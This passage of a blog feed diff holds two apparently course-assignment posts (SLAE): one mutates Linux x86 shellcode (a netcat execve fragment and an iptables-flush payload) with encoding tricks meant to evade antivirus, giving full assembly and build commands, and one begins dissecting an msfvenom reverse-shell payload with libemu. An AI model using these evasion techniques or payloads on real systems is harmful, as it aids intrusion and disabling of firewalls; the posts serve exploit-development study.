+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x636e2f6e&lt;/span&gt;     &lt;span class="c1"&gt;;//bin/nc&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x69622f2f&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;byte&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;0x80&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;I could continue modifying the shellcode to approach zero pattern correlation, but the size of the shellcode will inevitably go up. I will sacrifice the size of the shellcode mutating our last sample and show how some very simple steps can help you on the AV evasion path.&lt;/p&gt;
+&lt;h1&gt;Sample #3: Linux/x86 - iptables --flush - 43 bytes by Hamza Megahed&lt;/h1&gt;
+&lt;p&gt;The designation of the last shellcode sample I will analyze in this post is to &lt;a href="http://shell-storm.org/shellcode/files/shellcode-825.php"&gt;flush all iptables rules&lt;/a&gt;. Here is the original listing translated to Intel syntax:&lt;/p&gt;
+&lt;p&gt;section .text
+    global _start&lt;/p&gt;
+&lt;p&gt;_start:
+    xor eax, eax
+    push eax
+    push word 0x462d
+    mov esi, esp
+    push eax
+    push 0x73656c62
+    push 0x61747069
+    push 0x2f6e6962
+    push 0x732f2f2f
+    mov ebx, esp
+    push eax
+    push esi
+    push ebx
+    mov ecx, esp
+    mov edx, eax
+    mov al, 0xb
+    int 80h&lt;/p&gt;
+&lt;p&gt;All the shellcode does is calls the /sbin/iptables with -F flag.&lt;/p&gt;
+&lt;p&gt;A couple notes before I begin mutating the code. In this case I will not try to keep the shellcode from growing. Quite opposite, I will expand a line of code into two or more lines. The only limit that I am going to stick to is that the resulted shellcode mutant must not exceed 150% of the original shellcode size.&lt;/p&gt;
+&lt;p&gt;Despite of what I've just said I couldn't stop myself from decreasing the shellcode size by 1 byte first =). All in all this change helps us to achieve the end goal of changing the shellcode structure. To shave the byte off I replaced EAX with EDX in the following two instructions:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+
+&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And to make the shellcode working again I removed&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;and replaced&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;with&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
+&lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The line I removed zeroed out EDX, which was unneeded after previous modification, EDX is all 0s already at that step. And the replacement was just an equivalent of loading 0xb (execve syscall #) into EAX that doesn't depend on EAX being zeroed first.&lt;/p&gt;
+&lt;p&gt;Here is the intermediate result incorporating the above changes:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="kt"&gt;word&lt;/span&gt; &lt;span class="mh"&gt;0x462d&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x73656c62&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x61747069&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x2f6e6962&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x732f2f2f&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;80h&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Now let me show how with a little imagination you can expand any instruction thus modifying the underlying opcodes (but be careful to not add null or other bad chars relevant to your case):&lt;/p&gt;
+&lt;p&gt;1) The third line pushes the &lt;em&gt;-F&lt;/em&gt; string onto the stack. We can expand it in some fancy way:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x2316&lt;/span&gt;
+&lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x2317&lt;/span&gt;
+&lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;2) Now, why don't we apply some very lame encryption by manually subtracting 1 from every byte of the &lt;em&gt;///sbin/iptables&lt;/em&gt; string, and then dynamically add 1 to every byte, when it is already on the stack? Factum dictum. The modified part of the code follows:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x72646b61&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x60736F68&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x2e6d6861&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x722e2e2e&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+&lt;span class="c1"&gt;; Decryption&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;
+&lt;span class="nl"&gt;.decrypt:&lt;/span&gt;
+    &lt;span class="nf"&gt;lodsb&lt;/span&gt;
+    &lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+    &lt;span class="nf"&gt;stosb&lt;/span&gt;
+    &lt;span class="nf"&gt;loop&lt;/span&gt; &lt;span class="nv"&gt;.decrypt&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;3) I'd be happy to continue bubbling up the code, but at this point the initial 43 bytes of code became 62 bytes, which is just 2 bytes short of the 150% limit. To not waste those 2 bytes and mutate the code a little bit more we can insert a couple of nop-equivalents close to the end of the code. For that purpose I used the &lt;code&gt;std&lt;/code&gt; and &lt;code&gt;cld&lt;/code&gt; instructions that do not affect anything unless you are working with string instructions.&lt;/p&gt;
+&lt;p&gt;The final, working version of mutated shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="k"&gt;section&lt;/span&gt; &lt;span class="nv"&gt;.text&lt;/span&gt;
+    &lt;span class="k"&gt;global&lt;/span&gt; &lt;span class="nv"&gt;_start&lt;/span&gt;
+
+&lt;span class="nl"&gt;_start:&lt;/span&gt;
+    &lt;span class="nf"&gt;xor&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x2316&lt;/span&gt;
+    &lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mh"&gt;0x2317&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;bx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x72646b61&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x60736F68&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x2e6d6861&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0x722e2e2e&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+&lt;span class="c1"&gt;; Decryption &lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;esi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;edi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;cl&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;16&lt;/span&gt;
+&lt;span class="nl"&gt;.decrypt:&lt;/span&gt;
+    &lt;span class="nf"&gt;lodsb&lt;/span&gt;
+    &lt;span class="nf"&gt;add&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
+    &lt;span class="nf"&gt;stosb&lt;/span&gt;
+    &lt;span class="nf"&gt;loop&lt;/span&gt; &lt;span class="nv"&gt;.decrypt&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;edx&lt;/span&gt;
+    &lt;span class="nf"&gt;std&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebp&lt;/span&gt;
+    &lt;span class="nf"&gt;cld&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="nb"&gt;ebx&lt;/span&gt;
+    &lt;span class="nf"&gt;mov&lt;/span&gt; &lt;span class="nb"&gt;ecx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;esp&lt;/span&gt;
+    &lt;span class="nf"&gt;push&lt;/span&gt; &lt;span class="mh"&gt;0xb&lt;/span&gt;
+    &lt;span class="nf"&gt;pop&lt;/span&gt; &lt;span class="nb"&gt;eax&lt;/span&gt;
+    &lt;span class="nf"&gt;int&lt;/span&gt; &lt;span class="mh"&gt;80h&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;And to make sure it is still working you can build it and assuming that your iptables do not contain any rules (as, by default, is the case on Kali Linux) using the following commands:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;nasm -f elf ipt2.asm &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; ld -o ipt2 ipt2.o
+iptables -A INPUT -p tcp --dport &lt;span class="m"&gt;22&lt;/span&gt; -j ACCEPT &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; iptables -L -vn
+./ipt2 &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; iptables -L -vn
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;After running the second command you should see a rule added to the &lt;code&gt;INPUT&lt;/code&gt; chain of the filter table. After running the third command the rule should disappear (flushed by our code).&lt;/p&gt;
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;div class="divider"&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;hr&gt;
+This blog post was created for completing the requirements of the &lt;a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/"&gt;SecurityTube Linux Assembly Expert&lt;/a&gt; certification. Student id: SLAE-685.&lt;/p&gt;
+&lt;p&gt;The source files created while completing the assignment can be found in my &lt;a href="https://github.com/reider-roque/slae"&gt;GitHub repository&lt;/a&gt;.&lt;/p&gt;</summary><category term="exploit-development"></category><category term="slae"></category></entry><entry><title>Dissecting msfvenom shellcodes (SLAE, Assignment #5)</title><link href="http://unlim.xyz/blog/dissecting-msfvenom-shellcodes/" rel="alternate"></link><updated>2015-10-07T20:00:00-04:00</updated><author><name>Oleg Mitrofanov</name></author><id>tag:unlim.xyz,2015-10-07:blog/dissecting-msfvenom-shellcodes/</id><summary type="html">&lt;p&gt;In this post I will discuss how a shellcode logic and architecture can be understood. For that I will use &lt;code&gt;libemu&lt;/code&gt;, &lt;code&gt;ndisasm&lt;/code&gt;, and &lt;code&gt;gdb&lt;/code&gt;. &lt;code&gt;libemu&lt;/code&gt; is an x86 shellcode emulation framework that allows one to faster understand the shellcode logic. &lt;code&gt;ndisasm&lt;/code&gt; is a disassembler that comes as a part of &lt;code&gt;nasm&lt;/code&gt; package on Kali. And &lt;code&gt;gdb&lt;/code&gt; is the venerable GNU Debugger, arguably the best debugger for Linux if you are into CLI.&lt;/p&gt;
+&lt;p&gt;To generate payloads I will use Metasploit Framework (MSF). And instead of used in the past and recently phased out &lt;code&gt;msfpayload&lt;/code&gt; tool I will use its better replacement - &lt;code&gt;msfvenom&lt;/code&gt;.&lt;/p&gt;
+&lt;h1&gt;Installation of libemu&lt;/h1&gt;
+&lt;p&gt;When I was installing &lt;code&gt;libemu&lt;/code&gt; I expected to find it in Kali repositories, but alas it wasn't there. After googling a bit I found that most of the links led to &lt;a href="http://libemu.carnivore.it"&gt;libemu.carnivore.it&lt;/a&gt; page that was down at the time of this writing. So I had to find and fork its source code elsewhere on the GitHub. After getting my hands on its source code I followed this &lt;a href="http://blog.xanda.org/2012/05/16/installation-of-libemu-and-pylibemu-on-ubuntu/"&gt;guide on libemu installation&lt;/a&gt; successfully installed it on my system:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="c"&gt;# The only dependency I had to satisfy on my Kali machine&lt;/span&gt;
+apt-get install libtool
+&lt;span class="nb"&gt;cd&lt;/span&gt; ~/Downloads
+
+&lt;span class="c"&gt;# Cloning the source code from my GitHub repo&lt;/span&gt;
+git clone --depth&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt; https://github.com/reider-roque/libemu
+&lt;span class="nb"&gt;cd &lt;/span&gt;libemu
+
+&lt;span class="c"&gt;# Building and installing libemu&lt;/span&gt;
+autoreconf -i -v
+./configure --prefix&lt;span class="o"&gt;=&lt;/span&gt;/opt/libemu
+make install
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1&gt;Example #1: Reverse shell&lt;/h1&gt;
+&lt;p&gt;With the following command we will first see what Linux x86 payloads are available:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom --list payloads &lt;span class="p"&gt;|&lt;/span&gt; grep linux/x86
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output (truncated):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;linux/x86/adduser       Create a new user with UID 0
+linux/x86/chmod         Runs chmod on specified file with specified mode
+linux/x86/exec          Execute an arbitrary command
+linux/x86/meterpreter/bind_ipv6_tcp   
+Inject the meterpreter server payload (staged). Listen for an IPv6 connection (Linux x86)
+linux/x86/meterpreter/bind_ipv6_tcp_uuid            
+Inject the meterpreter server payload (staged). Listen for an IPv6 connection with UUID Support (Linux x86)
+linux/x86/meterpreter/bind_nonx_tcp
+Inject the meterpreter server payload (staged). Listen for a connection
+linux/x86/meterpreter/bind_tcp
+Inject the meterpreter server payload (staged). Listen for a connection (Linux x86)
+...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;As you can see, most of the available payloads are for spawning either reverse or bind shells. By the way this is the reason the shellcode is called so: shellcode is a sequence of assembly instructions that is most often used in exploits to spawn an (administrative) shell.&lt;/p&gt;
+&lt;p&gt;For the first example I will take and dissect the reverse shell payload. Let's first see if there are mandatory options for this payload (output is truncated for brevity):&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/shell_reverse_tcp --payload-options
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Output:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;Options for payload/linux/x86/shell_reverse_tcp:
+...
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+LHOST                   yes       The listen address
+LPORT  4444             yes       The listen port
+...
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;From the output above we can see that there are two required options, with one of them not having any default value. So for proper work of the payload we can leave &lt;code&gt;LPORT&lt;/code&gt; at its default value, but we'll need to supply the &lt;code&gt;LHOST&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Below I will pipe the generated payload into the &lt;code&gt;sctest&lt;/code&gt;, binary that comes with &lt;code&gt;libemu&lt;/code&gt; framework, which will analyze the code and try to generate a high level structure of the shellcode:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;msfvenom -p linux/x86/shell_reverse_tcp &lt;span class="nv"&gt;LHOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;127.1.1.1 -f raw &lt;span class="p"&gt;|&lt;/span&gt; /opt/libemu/bin/sctest -vvv -S -s &lt;span class="m"&gt;100000&lt;/span&gt; -G tmp.dot
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The &lt;code&gt;-vvv&lt;/code&gt; option to &lt;code&gt;sctest&lt;/code&gt; increases verbosity. The &lt;code&gt;-S&lt;/code&gt; is for reading input from stdin. The &lt;code&gt;-s&lt;/code&gt; option controls the maximum number of instructions to execute and defaults to 1, which means &lt;code&gt;sctest&lt;/code&gt; will emulate execution of only the first instruction of the supplied shellcode. To be on the safe side and make sure that every shellcode instruction is executed it is usually set to some big number, like 100000.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Top of the sctest output" src="http://unlim.xyz/images/dissecting-msfvenom-shellcodes/sctest-top-output.png" title="Top of the sctest output" /&gt;
+&lt;div class="img-caption"&gt;Top of the sctest output&lt;/div&gt;&lt;/p&gt;
+&lt;p&gt;At the top of the output you can see how &lt;code&gt;sctest&lt;/code&gt; tears down the shellcode instruction by instruction and shows you the state of registers after execution of each instruction. At the bottom of the output you will find the reconstructed high level view of what's going on:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;domain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;type&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;protocol&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;dup2&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;oldfd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;newfd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;dup2&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;oldfd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;newfd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;dup2&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;oldfd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;newfd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;connect&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
+     &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;sockfd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;14&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+     &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;sockaddr_in&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;serv_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mh"&gt;0x00416fbe&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; 
+         &lt;span class="k"&gt;struct&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
+             &lt;span class="kt"&gt;short&lt;/span&gt; &lt;span class="n"&gt;sin_family&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
+             &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;short&lt;/span&gt; &lt;span class="n"&gt;sin_port&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;23569&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;port&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;4444&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
+             &lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;in_addr&lt;/span&gt; &lt;span class="n"&gt;sin_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
